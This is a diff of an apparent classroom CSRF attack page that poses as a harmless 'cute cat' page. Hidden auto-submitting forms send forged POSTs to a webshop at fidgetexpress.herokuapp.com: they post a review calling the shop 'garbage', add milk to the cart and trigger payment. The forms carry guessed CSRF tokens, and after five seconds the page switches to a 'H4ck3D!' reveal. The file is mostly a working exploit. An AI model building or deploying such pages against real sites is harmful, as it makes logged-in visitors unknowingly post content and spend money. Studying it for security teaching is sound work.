@@ -3,7 +3,7 @@
   body {
     text-align: center;
   }
-  .container {
+  #container {
     width: 100%;
     height: 60%;
     margin: auto;
@@ -15,34 +15,46 @@
   </style>
 </head>
 <body>
-  <h1>Look at this cute cat!</h1>
-  <div class="container"></div>​
-  <h3>This cat actually does nothing, it's just a <b>cute cat</b>.</h3>
-  <p>Oh and by the way, you didnt have <a href="https://fidgetexpress.herokuapp.com">fidgetexpress</a> <b>opened</b> in another <b>tab</b>? Oh, you where also <b>logged in</b>!? I'm sorry too bad :(</p>
-  <p>Did you also buy way too much <b>Milk</b>, I feel you.</p>
+  <h1 id="title">Look at this cute cat!</h1>
+  <div id="container" style="overflow: hidden">
+    <iframe style="width: 100%; height: 100vh" name="csrf-pay" frameBorder="0"></iframe>
+  </div>​
+  <h3 id="safe">This cat actually does nothing, it's just a <b>cute cat</b>.</h3>
+  <div id="hack" style="display: none">
+    <h4>Oh and by the way, you didnt have <a href="https://fidgetexpress.herokuapp.com">fidgetexpress</a> <b>opened</b> in another <b>tab</b>?</h4>
+    <h4>Oh, you where also <b>logged in</b>!? I'm sorry too bad :(</h4>
+    <p>Did you also buy way too much <b>Milk</b>, I feel you.</p>
+  </div>
 
-  <iframe style="display: none" name="csrf-edit"></iframe>
+  <iframe style="display: none" name="csrf-review"></iframe>
   <iframe style="display: none" name="csrf-buy-milk"></iframe>
-  <iframe style="display: none" name="csrf-pay"></iframe>
 
-  <form method="POST" action="https://fidgetexpress.herokuapp.com/edit.php" target="csrf-edit">
-    <input type="hidden" name="action" value="ADD">
-    <input type="hidden" name="name" value="hacked">
-    <input type="hidden" name="price" value="1337">
+  <form method="POST" action="https://fidgetexpress.herokuapp.com/review.php" target="csrf-review">
+    <input type="hidden" name="subject" value="This is a review">
+    <input type="hidden" name="review" value="This webshop is garbage!">
+    <input type="hidden" name="csrf_token" value="I DON'T KNOW!?">
   </form>
   <form method="POST" action="https://fidgetexpress.herokuapp.com/store.php" target="csrf-buy-milk">
     <input type="hidden" name="itemIds[1]" value="0">
     <input type="hidden" name="itemIds[2]" value="0">
-    <input type="hidden" name="itemIds[3]" value="1337">
+    <input type="hidden" name="itemIds[3]" value="10">
     <input type="hidden" name="add">
+    <input type="hidden" name="csrf_token" value="I DON'T KNOW?!">
   </form>
   <form method="POST" action="https://fidgetexpress.herokuapp.com/payment.php" target="csrf-pay">
     <input type="hidden" name="pay">
+    <input type="hidden" name="csrf_token" value="I DON'T KNOW?!">
   </form>
 
   <script>
     document.forms[0].submit();
     document.forms[1].submit();
-    document.forms[2].submit();
+    setTimeout(function(){
+      document.forms[2].submit();
+      document.getElementById('title').innerHTML = "H4ck3D!";
+      document.getElementById('container').style.backgroundImage = "url('./hacked.jpg')";
+      document.getElementById('hack').style.display = "block";
+      document.getElementById('safe').style.display = "none";
+    }, 5000);
   </script>
 </body>
